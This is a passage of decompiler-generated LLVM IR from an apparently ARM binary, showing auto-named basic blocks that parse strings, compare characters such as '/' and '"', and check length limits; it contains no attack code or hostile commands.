  br i1 %v7_9798, label %bb233, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_977c
  store i32 %v2_9794, i32* @r4, align 4
  br label %bb234

bb233:                                            ; preds = %dec_label_pc_977c
  %v2_979c = add i32 %v3_9788, 2
  store i32 %v2_979c, i32* %ip.global-to-local, align 4
  %v2_97a0 = add i32 %v0_9794, %v2_979c
  store i32 %v2_97a0, i32* @r4, align 4
  store i32 %v2_979c, i32* %stack_var_-40, align 4
  br label %bb234

bb234:                                            ; preds = %.thread56, %bb233
  %v0_97a8 = phi i32 [ %v2_9794, %.thread56 ], [ %v2_97a0, %bb233 ]
  store i32 %v0_97a8, i32* %r0.global-to-local, align 4
  %v1_97ac = inttoptr i32 %v0_97a8 to i8*
  %v2_97ac = call i32 @function_124dc(i8* %v1_97ac)
  store i32 ptrtoint ([5 x i8]* @global_var_15788.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_97ac, i32* @r1, align 4
  %v0_97b8 = load i32, i32* @r4, align 4
  store i32 %v0_97b8, i32* %r0.global-to-local, align 4
  %v4_97bc = inttoptr i32 %v0_97b8 to i8*
  %v5_97bc = call i32 @function_12830(i8* %v4_97bc, i32 %v2_97ac, i32 ptrtoint ([5 x i8]* @global_var_15788.46 to i32))
  store i32 %v5_97bc, i32* %r0.global-to-local, align 4
  %v1_97c0 = add i32 %v5_97bc, 1
  %v2_97c0 = icmp eq i32 %v5_97bc, -1
  store i1 %v2_97c0, i1* %cpsr_c.global-to-local, align 1
  %v3_97c0 = sub i32 0, %v5_97bc
  %v4_97c0 = and i32 %v1_97c0, %v3_97c0
  %v5_97c0 = icmp slt i32 %v4_97c0, 0
  store i1 %v5_97c0, i1* %cpsr_v.global-to-local, align 1
  %v6_97c0 = icmp slt i32 %v1_97c0, 0
  store i1 %v6_97c0, i1* %cpsr_n.global-to-local, align 1
  %v7_97c0 = icmp eq i32 %v1_97c0, 0
  store i1 %v7_97c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97c0, label %.thread60, label %dec_label_pc_97d0

.thread60:                                        ; preds = %bb234
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_97c8 = load i32, i32* %v11_82f4, align 4
  store i32 %v4_97c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9804

dec_label_pc_97d0:                                ; preds = %bb234
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_97d4 = load i32, i32* %stack_var_-40, align 4
  %v0_97d8 = load i32, i32* @r6, align 4
  %v2_97d8 = add i32 %v0_97d8, %v3_97d4
  store i32 %v2_97d8, i32* @r4, align 4
  store i32 %v2_97d8, i32* %r0.global-to-local, align 4
  %v1_97e0 = inttoptr i32 %v2_97d8 to i8*
  %v2_97e0 = call i32 @function_124dc(i8* %v1_97e0)
  store i32 ptrtoint ([5 x i8]* @global_var_15788.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_97e0, i32* @r1, align 4
  %v0_97ec = load i32, i32* @r4, align 4
  store i32 %v0_97ec, i32* %r0.global-to-local, align 4
  %v4_97f0 = inttoptr i32 %v0_97ec to i8*
  %v5_97f0 = call i32 @function_12830(i8* %v4_97f0, i32 %v2_97e0, i32 ptrtoint ([5 x i8]* @global_var_15788.46 to i32))
  store i32 %v5_97f0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_97f8 = load i32, i32* %stack_var_-40, align 4
  %v2_97fc = add i32 %v3_97f8, %v5_97f0
  store i32 %v2_97fc, i32* %ip.global-to-local, align 4
  store i32 %v2_97fc, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %.thread60, %dec_label_pc_97d0
  %v0_9d8c = phi i32 [ %v4_97c8, %.thread60 ], [ %v2_97fc, %dec_label_pc_97d0 ]
  %v0_9804 = load i32, i32* @r6, align 4
  %v2_9804 = add i32 %v0_9804, %v0_9d8c
  %v3_9804 = inttoptr i32 %v2_9804 to i8*
  %v4_9804 = load i8, i8* %v3_9804, align 1
  %v6_9804 = zext i8 %v4_9804 to i32
  store i32 %v6_9804, i32* %r3.global-to-local, align 4
  %v2_9808 = icmp ugt i8 %v4_9804, 33
  store i1 %v2_9808, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9808 = icmp ult i8 %v4_9804, 34
  store i1 %v6_9808, i1* %cpsr_n.global-to-local, align 1
  %v7_9808 = icmp eq i8 %v4_9804, 34
  store i1 %v7_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9808, label %dec_label_pc_9d8c, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_9d8c, %dec_label_pc_9804, %dec_label_pc_9db4
  %v0_9810 = load i32, i32* @r6, align 4
  store i32 %v0_9810, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_9818 = inttoptr i32 %v0_9810 to i8*
  %v3_9818 = call i32 @function_12608(i8* %v2_9818, i32 10)
  store i32 %v3_9818, i32* %r0.global-to-local, align 4
  %v1_981c = add i32 %v3_9818, -1
  store i32 %v1_981c, i32* %r3.global-to-local, align 4
  %v1_9820 = add i32 %v3_9818, -9
  %v2_9820 = icmp ugt i32 %v1_981c, 7
  store i1 %v2_9820, i1* %cpsr_c.global-to-local, align 1
  %v3_9820 = sub i32 8, %v3_9818
  %v4_9820 = and i32 %v3_9820, %v1_981c
  %v5_9820 = icmp slt i32 %v4_9820, 0
  store i1 %v5_9820, i1* %cpsr_v.global-to-local, align 1
  %v6_9820 = icmp slt i32 %v1_9820, 0
  store i1 %v6_9820, i1* %cpsr_n.global-to-local, align 1
  %v7_9820 = icmp eq i32 %v1_981c, 8
  store i1 %v7_9820, i1* %cpsr_z.global-to-local, align 1
  %v2_9824 = xor i1 %v2_9820, true
  %v3_9824 = or i1 %v7_9820, %v2_9824
  br i1 %v3_9824, label %dec_label_pc_9838.preheader, label %dec_label_pc_984c

dec_label_pc_9838.preheader:                      ; preds = %dec_label_pc_9810
  store i32 %v2_87d8, i32* %ip.global-to-local, align 4
  %v6_9828 = add i32 %v3_9818, %v2_87d8
  store i32 %v6_9828, i32* @r4, align 4
  br label %dec_label_pc_9838

dec_label_pc_9834:                                ; preds = %dec_label_pc_9838
  %v1_9834 = call i32 @function_142c4(i32 1)
  store i32 %v1_9834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9838

dec_label_pc_9838:                                ; preds = %dec_label_pc_9838.preheader, %dec_label_pc_9834
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_983c = call i32 @function_1316c(i32* null)
  %v1_9840 = load i32, i32* @r4, align 4
  %v2_9840 = sub i32 %v2_983c, %v1_9840
  %v3_9840 = icmp uge i32 %v2_983c, %v1_9840
  store i1 %v3_9840, i1* %cpsr_c.global-to-local, align 1
  %v4_9840 = xor i32 %v1_9840, %v2_983c
  %v5_9840 = xor i32 %v2_9840, %v2_983c
  %v6_9840 = and i32 %v5_9840, %v4_9840
  %v7_9840 = icmp slt i32 %v6_9840, 0
  store i1 %v7_9840, i1* %cpsr_v.global-to-local, align 1
  %v8_9840 = icmp slt i32 %v2_9840, 0
  store i1 %v8_9840, i1* %cpsr_n.global-to-local, align 1
  %v9_9840 = icmp eq i32 %v2_983c, %v1_9840
  store i1 %v9_9840, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_9840, label %dec_label_pc_984c, label %dec_label_pc_9834

dec_label_pc_984c:                                ; preds = %dec_label_pc_9838, %dec_label_pc_9810
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9850 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9850, i32* @r4, align 4
  %v0_9854 = load i32, i32* @r6, align 4
  %v2_9854 = add i32 %v0_9854, %v3_9850
  store i32 %v2_9854, i32* @r5, align 4
  store i32 %v2_9854, i32* %r0.global-to-local, align 4
  %v1_985c = inttoptr i32 %v2_9854 to i8*
  %v2_985c = call i32 @function_124dc(i8* %v1_985c)
  store i32 ptrtoint ([5 x i8]* @global_var_15780.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_985c, i32* @r1, align 4
  %v0_9868 = load i32, i32* @r5, align 4
  store i32 %v0_9868, i32* %r0.global-to-local, align 4
  %v4_986c = inttoptr i32 %v0_9868 to i8*
  %v5_986c = call i32 @function_12830(i8* %v4_986c, i32 %v2_985c, i32 ptrtoint ([5 x i8]* @global_var_15780.44 to i32))
  store i32 %v5_986c, i32* %r0.global-to-local, align 4
  %v1_9870 = add i32 %v5_986c, -4
  %v2_9870 = icmp ugt i32 %v5_986c, 3
  store i1 %v2_9870, i1* %cpsr_c.global-to-local, align 1
  %v3_9870 = sub i32 3, %v5_986c
  %v4_9870 = and i32 %v3_9870, %v5_986c
  %v5_9870 = icmp slt i32 %v4_9870, 0
  store i1 %v5_9870, i1* %cpsr_v.global-to-local, align 1
  %v6_9870 = icmp slt i32 %v1_9870, 0
  store i1 %v6_9870, i1* %cpsr_n.global-to-local, align 1
  %v7_9870 = icmp eq i32 %v5_986c, 4
  store i1 %v7_9870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9870, label %dec_label_pc_9c68, label %dec_label_pc_9878

dec_label_pc_9878:                                ; preds = %dec_label_pc_984c
  %v0_9878 = load i32, i32* @r6, align 4
  %v1_9878 = load i32, i32* @r4, align 4
  %v2_9878 = add i32 %v1_9878, %v0_9878
  %v3_9878 = inttoptr i32 %v2_9878 to i8*
  %v4_9878 = load i8, i8* %v3_9878, align 1
  %v6_9878 = zext i8 %v4_9878 to i32
  store i32 %v6_9878, i32* %r3.global-to-local, align 4
  %v2_987c = icmp ugt i8 %v4_9878, 46
  store i1 %v2_987c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_987c = icmp ult i8 %v4_9878, 47
  store i1 %v6_987c, i1* %cpsr_n.global-to-local, align 1
  %v7_987c = icmp eq i8 %v4_9878, 47
  store i1 %v7_987c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_987c, label %dec_label_pc_9de0, label %dec_label_pc_9884

dec_label_pc_9884:                                ; preds = %dec_label_pc_9dfc, %dec_label_pc_9de0, %dec_label_pc_9d38, %dec_label_pc_9d1c, %dec_label_pc_9878, %dec_label_pc_9e2c, %dec_label_pc_9d68
  %v0_9884 = load i32, i32* %sb.global-to-local, align 4
  %v1_9888 = add i32 %v0_9884, 1431
  store i32 %v1_9888, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1575c.21 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v4_9894 = call i32 @function_134b0(i32 %v1_9888, i32 ptrtoint ([4 x i8]* @global_var_1575c.21 to i32), i32 4)
  store i32 %v4_9894, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_989c = load i32, i32* @r8, align 4
  %v3_989c = add i32 %v2_989c, -1452
  %v4_989c = inttoptr i32 %v3_989c to i8*
  store i8 10, i8* %v4_989c, align 1
  br label %dec_label_pc_8838

dec_label_pc_98a4:                                ; preds = %dec_label_pc_8610
  store i32 %v1_8610, i32* %r3.global-to-local, align 4
  %v1_98a8 = trunc i32 %v1_8610 to i8
  store i8 %v1_98a8, i8* %v2_8650, align 1
  %v0_98ac = load i32, i32* @r6, align 4
  %v1_98ac = add i32 %v0_98ac, -1431
  %v2_98ac = inttoptr i32 %v1_98ac to i32*
  %v3_98ac = load i32, i32* %v2_98ac, align 4
  store i32 %v3_98ac, i32* %r0.global-to-local, align 4
  %v1_98b0 = call i32 @function_12e9c(i32 %v3_98ac)
  store i32 %v1_98b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_98b8 = load i32, i32* @r6, align 4
  %v2_98b8 = add i32 %v1_98b8, -1431
  %v3_98b8 = inttoptr i32 %v2_98b8 to i32*
  store i32 -1, i32* %v3_98b8, align 4
  br label %dec_label_pc_8630

dec_label_pc_98c0:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9678, %dec_label_pc_9774
  %v0_98c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_98c0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15774.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v5_98d0 = call i32 @function_125a0(i32 %v2_8280, i32 %v0_98c0, i32 ptrtoint ([5 x i8]* @global_var_15774.40 to i32), i32 4)
  %v0_98d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_98d8 = add i32 %v0_98d4, 1431
  store i32 %v1_98d8, i32* @r4, align 4
  store i32 %v5_98d0, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15790.48 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_98d8, i32* %r0.global-to-local, align 4
  %v3_98e8 = inttoptr i32 %v1_98d8 to i8*
  %v4_98e8 = call i32 @function_128bc(i8* %v3_98e8, i32 ptrtoint ([5 x i8]* @global_var_15790.48 to i32))
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_98ec = icmp slt i32 %v4_98e8, 0
  store i1 %v1_98ec, i1* %cpsr_n.global-to-local, align 1
  %v2_98ec = icmp eq i32 %v4_98e8, 0
  store i1 %v2_98ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_98ec, label %dec_label_pc_9aa8, label %dec_label_pc_98f4

dec_label_pc_98f4:                                ; preds = %dec_label_pc_9aa8, %dec_label_pc_98c0
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_98f8 = load i32, i32* @r8, align 4
  %v3_98f8 = add i32 %v2_98f8, -1452
  %v4_98f8 = inttoptr i32 %v3_98f8 to i8*
  store i8 7, i8* %v4_98f8, align 1
  br label %dec_label_pc_98fc

dec_label_pc_98fc:                                ; preds = %bb240, %dec_label_pc_98f4
  %v0_98fc = load i32, i32* @r5, align 4
  store i32 %v0_98fc, i32* %r2.global-to-local, align 4
  %v0_9900 = load i32, i32* @r8, align 4
  %v1_9900 = add i32 %v0_9900, -1456
  %v2_9900 = inttoptr i32 %v1_9900 to i32*
  %v3_9900 = load i32, i32* %v2_9900, align 4
  store i32 %v3_9900, i32* %r0.global-to-local, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_990c = call i32 @function_136a0(i32 %v3_9900, i32* nonnull %stack_var_-20809, i32 %v0_98fc, i32 16384)
  store i32 %v5_990c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8838

dec_label_pc_9914:                                ; preds = %dec_label_pc_8e04
  %v2_9914 = add i32 %v0_9914, -10240
  %v3_9914 = icmp ugt i32 %v0_9914, 10239
  store i1 %v3_9914, i1* %cpsr_c.global-to-local, align 1
  %v4_9914 = sub i32 10239, %v0_9914
  %v5_9914 = and i32 %v4_9914, %v0_9914
  %v6_9914 = icmp slt i32 %v5_9914, 0
  store i1 %v6_9914, i1* %cpsr_v.global-to-local, align 1
  %v7_9914 = icmp slt i32 %v2_9914, 0
  store i1 %v7_9914, i1* %cpsr_n.global-to-local, align 1
  %v8_9914 = icmp eq i32 %v0_9914, 10240
  store i1 %v8_9914, i1* %cpsr_z.global-to-local, align 1
  %v5_9918 = icmp slt i32 %v0_9914, 10240
  br i1 %v5_9918, label %dec_label_pc_8838, label %dec_label_pc_8e20

dec_label_pc_9920:                                ; preds = %dec_label_pc_9628
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9924 = load i32, i32* @r4, align 4
  %v2_9924 = inttoptr i32 %v1_9924 to i32*
  store i32 104, i32* %v2_9924, align 4
  br label %dec_label_pc_965c

dec_label_pc_992c:                                ; preds = %dec_label_pc_9430
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9930 = load i32, i32* %fp.global-to-local, align 4
  %v2_9930 = inttoptr i32 %v1_9930 to i32*
  store i32 104, i32* %v2_9930, align 4
  br label %dec_label_pc_9934

dec_label_pc_9934:                                ; preds = %dec_label_pc_9950, %dec_label_pc_992c
  %v0_9934 = load i32, i32* @r8, align 4
  %v1_9934 = add i32 %v0_9934, -1456
  %v2_9934 = inttoptr i32 %v1_9934 to i32*
  %v3_9934 = load i32, i32* %v2_9934, align 4
  store i32 %v3_9934, i32* %r0.global-to-local, align 4
  %v1_9938 = call i32 @function_12e9c(i32 %v3_9934)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_9944 = load i32, i32* @r8, align 4
  %v2_9944 = add i32 %v1_9944, -1456
  %v3_9944 = inttoptr i32 %v2_9944 to i32*
  store i32 -1, i32* %v3_9944, align 4
  %v0_9948 = load i32, i32* %lr.global-to-local, align 4
  %v1_9948 = trunc i32 %v0_9948 to i8
  %v2_9948 = load i32, i32* @r8, align 4
  %v3_9948 = add i32 %v2_9948, -1452
  %v4_9948 = inttoptr i32 %v3_9948 to i8*
  store i8 %v1_9948, i8* %v4_9948, align 1
  br label %dec_label_pc_8838

dec_label_pc_9950:                                ; preds = %dec_label_pc_9458
  %v0_9950 = load i32, i32* %fp.global-to-local, align 4
  %v1_9950 = inttoptr i32 %v0_9950 to i32*
  %v2_9950 = load i32, i32* %v1_9950, align 4
  store i32 %v2_9950, i32* %r3.global-to-local, align 4
  %v1_9954 = add i32 %v2_9950, -11
  %v2_9954 = icmp ugt i32 %v2_9950, 10
  store i1 %v2_9954, i1* %cpsr_c.global-to-local, align 1
  %v3_9954 = sub i32 10, %v2_9950
  %v4_9954 = and i32 %v3_9954, %v2_9950
  %v5_9954 = icmp slt i32 %v4_9954, 0
  store i1 %v5_9954, i1* %cpsr_v.global-to-local, align 1
  %v6_9954 = icmp slt i32 %v1_9954, 0
  store i1 %v6_9954, i1* %cpsr_n.global-to-local, align 1
  %v7_9954 = icmp eq i32 %v2_9950, 11
  store i1 %v7_9954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9954, label %dec_label_pc_8838, label %dec_label_pc_9934

dec_label_pc_9960:                                ; preds = %bb230
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_996c = load i32, i32* @r5, align 4
  %v1_996c = add i32 %v0_996c, 4
  %v2_996c = inttoptr i32 %v1_996c to i8*
  %v3_996c = load i8, i8* %v2_996c, align 1
  %v4_996c = zext i8 %v3_996c to i32
  store i32 %v4_996c, i32* %r3.global-to-local, align 4
  %v2_9970 = icmp ugt i8 %v3_996c, 114
  store i1 %v2_9970, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9970 = icmp ult i8 %v3_996c, 115
  store i1 %v6_9970, i1* %cpsr_n.global-to-local, align 1
  %v7_9970 = icmp eq i8 %v3_996c, 115
  store i1 %v7_9970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9970, label %bb235, label %.thread63

bb235:                                            ; preds = %dec_label_pc_9960
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_9960, %bb235
  %v3_9980 = phi i32 [ 7, %dec_label_pc_9960 ], [ 8, %bb235 ]
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 %v0_996c, i32* @r0, align 4
  %v1_9988 = load i32, i32* %r6.global-to-local, align 4
  %v2_9988 = sub i32 %v1_9988, %v3_9980
  store i32 %v2_9988, i32* @r2, align 4
  %v2_998c = add i32 %v3_9980, %v0_996c
  store i32 %v2_998c, i32* @r1, align 4
  %v3_9990 = call i32 @function_134c0(i32 %v0_996c, i32 %v2_998c, i32 %v2_9988)
  store i32 %v3_9990, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v0_9998 = load i32, i32* @r7, align 4
  store i32 %v0_9998, i32* %stack_var_-40, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  %v1_99a0 = load i32, i32* @r4, align 4
  %v2_99a0 = add i32 %v1_99a0, %v2_8280
  %v3_99a0 = inttoptr i32 %v2_99a0 to i8*
  %v4_99a0 = load i8, i8* %v3_99a0, align 1
  %v6_99a0 = zext i8 %v4_99a0 to i32
  store i32 %v6_99a0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_99a4 = icmp eq i8 %v4_99a0, 0
  store i1 %v2_99a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99a4, label %dec_label_pc_99e8, label %dec_label_pc_99ac

dec_label_pc_99ac:                                ; preds = %.thread63
  %v2_99ac = icmp ugt i8 %v4_99a0, 46
  store i1 %v2_99ac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_99ac = icmp ult i8 %v4_99a0, 47
  store i1 %v6_99ac, i1* %cpsr_n.global-to-local, align 1
  %v7_99ac = icmp eq i8 %v4_99a0, 47
  store i1 %v7_99ac, i1* %cpsr_z.global-to-local, align 1
  %v1_99b0 = load i32, i32* @r5, align 4
  br i1 %v7_99ac, label %bb236, label %dec_label_pc_99b8

bb236:                                            ; preds = %dec_label_pc_99ac
  store i32 %v1_99b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9b48

dec_label_pc_99b8:                                ; preds = %dec_label_pc_99ac
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_99c8

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99c8
  %v2_99c0 = icmp ugt i8 %v4_99d4, 46
  store i1 %v2_99c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_99c0 = icmp ult i8 %v4_99d4, 47
  store i1 %v6_99c0, i1* %cpsr_n.global-to-local, align 1
  %v7_99c0 = icmp eq i8 %v4_99d4, 47
  store i1 %v7_99c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_99c0, label %dec_label_pc_9b48, label %dec_label_pc_99c8

dec_label_pc_99c8:                                ; preds = %dec_label_pc_99c0, %dec_label_pc_99b8
  %v0_99dc = phi i32 [ %v1_99dc, %dec_label_pc_99c0 ], [ 1, %dec_label_pc_99b8 ]
  store i32 %v0_99dc, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 %v0_99dc, i32* %stack_var_-40, align 4
  %v2_99d4 = add i32 %v0_99dc, %v1_99b0
  %v3_99d4 = inttoptr i32 %v2_99d4 to i8*
  %v4_99d4 = load i8, i8* %v3_99d4, align 1
  %v6_99d4 = zext i8 %v4_99d4 to i32
  store i32 %v6_99d4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_99d8 = icmp eq i8 %v4_99d4, 0
  store i1 %v2_99d8, i1* %cpsr_z.global-to-local, align 1
  %v1_99dc = add i32 %v0_99dc, 1
  store i32 %v1_99dc, i32* %r3.global-to-local, align 4
  store i32 %v2_99d4, i32* %r1.global-to-local, align 4
  br i1 %v2_99d8, label %dec_label_pc_99e8, label %dec_label_pc_99c0

dec_label_pc_99e8:                                ; preds = %dec_label_pc_99c8, %.thread63, %dec_label_pc_9b48
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r0.global-to-local, align 4
  %v1_99ec = inttoptr i32 %v0_99e8 to i8*
  %v2_99ec = call i32 @function_124dc(i8* %v1_99ec)
  store i32 %v2_99ec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_99f0 = icmp slt i32 %v2_99ec, 0
  store i1 %v1_99f0, i1* %cpsr_n.global-to-local, align 1
  %v2_99f0 = icmp eq i32 %v2_99ec, 0
  store i1 %v2_99f0, i1* %cpsr_z.global-to-local, align 1
  %tmp237 = icmp slt i32 %v2_99ec, 1
  br i1 %tmp237, label %dec_label_pc_9a14, label %dec_label_pc_99f8

dec_label_pc_99f8:                                ; preds = %dec_label_pc_99e8
  %v0_99f8 = load i32, i32* @r5, align 4
  store i32 %v0_99f8, i32* %r0.global-to-local, align 4
  %v1_99fc = inttoptr i32 %v0_99f8 to i8*
  %v2_99fc = call i32 @function_124dc(i8* %v1_99fc)
  store i32 %v2_99fc, i32* %r0.global-to-local, align 4
  %v1_9a00 = add i32 %v2_99fc, -127
  %v2_9a00 = icmp ugt i32 %v2_99fc, 126
  store i1 %v2_9a00, i1* %cpsr_c.global-to-local, align 1
  %v3_9a00 = sub i32 126, %v2_99fc
  %v4_9a00 = and i32 %v3_9a00, %v2_99fc
  %v5_9a00 = icmp slt i32 %v4_9a00, 0
  store i1 %v5_9a00, i1* %cpsr_v.global-to-local, align 1
  %v6_9a00 = icmp slt i32 %v1_9a00, 0
  store i1 %v6_9a00, i1* %cpsr_n.global-to-local, align 1
  %v7_9a00 = icmp eq i32 %v2_99fc, 127
  store i1 %v7_9a00, i1* %cpsr_z.global-to-local, align 1
  %v7_9a04 = icmp sgt i32 %v2_99fc, 127
  br i1 %v7_9a04, label %.thread66, label %bb238

bb238:                                            ; preds = %dec_label_pc_99f8
  %v8_9a04 = load i32, i32* %sb.global-to-local, align 4
  %v9_9a08 = add i32 %v8_9a04, 789
  store i32 %v9_9a08, i32* %r0.global-to-local, align 4
  %v8_9a0c = load i32, i32* @r5, align 4
  store i32 %v8_9a0c, i32* %r1.global-to-local, align 4
  br label %.thread66

.thread66:                                        ; preds = %dec_label_pc_99f8, %bb238
  store i32 39444, i32* %lr.global-to-local, align 4
  %v3_9a10 = xor i1 %v6_9a00, %v5_9a00
  %v4_9a10 = or i1 %v7_9a00, %v3_9a10
  call void @__pseudo_cond_branch(i1 %v4_9a10, i32 ptrtoint (i32* @global_var_12504.49 to i32))
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_99e8, %.thread66
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9a18 = load i32, i32* %stack_var_-40, align 4
  %v0_9a1c = load i32, i32* @r5, align 4
  %v2_9a1c = add i32 %v3_9a18, 1
  %v1_9a20 = add i32 %v2_9a1c, %v0_9a1c
  store i32 %v1_9a20, i32* %r0.global-to-local, align 4
  %v1_9a24 = inttoptr i32 %v1_9a20 to i8*
  %v2_9a24 = call i32 @function_124dc(i8* %v1_9a24)
  store i32 %v2_9a24, i32* %r0.global-to-local, align 4
  %v1_9a28 = add i32 %v2_9a24, -255
  %v2_9a28 = icmp ugt i32 %v2_9a24, 254
  store i1 %v2_9a28, i1* %cpsr_c.global-to-local, align 1
  %v3_9a28 = sub i32 254, %v2_9a24
  %v4_9a28 = and i32 %v3_9a28, %v2_9a24
  %v5_9a28 = icmp slt i32 %v4_9a28, 0
  store i1 %v5_9a28, i1* %cpsr_v.global-to-local, align 1
  %v6_9a28 = icmp slt i32 %v1_9a28, 0
  store i1 %v6_9a28, i1* %cpsr_n.global-to-local, align 1
  %v7_9a28 = icmp eq i32 %v2_9a24, 255
  store i1 %v7_9a28, i1* %cpsr_z.global-to-local, align 1
  %v8_9a2c = icmp sgt i32 %v2_9a24, 255
  br i1 %v8_9a2c, label %dec_label_pc_9400, label %dec_label_pc_9a30

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a14
  %v0_9a30 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a34 = add i32 %v0_9a30, 533
  store i32 %v1_9a34, i32* @r4, align 4
  store i32 %v1_9a34, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9a40 = call i32 @function_1257c(i32 %v1_9a34, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9a48 = load i32, i32* %stack_var_-40, align 4
  %v0_9a4c = load i32, i32* @r5, align 4
  %v2_9a4c = add i32 %v3_9a48, 1
  %v1_9a50 = add i32 %v2_9a4c, %v0_9a4c
  store i32 %v1_9a50, i32* %r0.global-to-local, align 4
  %v1_9a54 = inttoptr i32 %v1_9a50 to i8*
  %v2_9a54 = call i32 @function_124dc(i8* %v1_9a54)
  store i32 %v2_9a54, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9a58 = icmp slt i32 %v2_9a54, 0
  store i1 %v1_9a58, i1* %cpsr_n.global-to-local, align 1
  %v2_9a58 = icmp eq i32 %v2_9a54, 0
  store i1 %v2_9a58, i1* %cpsr_z.global-to-local, align 1
  %tmp239 = icmp slt i32 %v2_9a54, 1
  br i1 %tmp239, label %dec_label_pc_9400, label %dec_label_pc_9a60

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a30
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9a64 = load i32, i32* %stack_var_-40, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  %v0_9a6c = load i32, i32* @r4, align 4
  store i32 %v0_9a6c, i32* @r0, align 4
  %v2_9a68 = add i32 %v3_9a64, 1
  %v1_9a70 = add i32 %v2_9a68, %v0_9a68
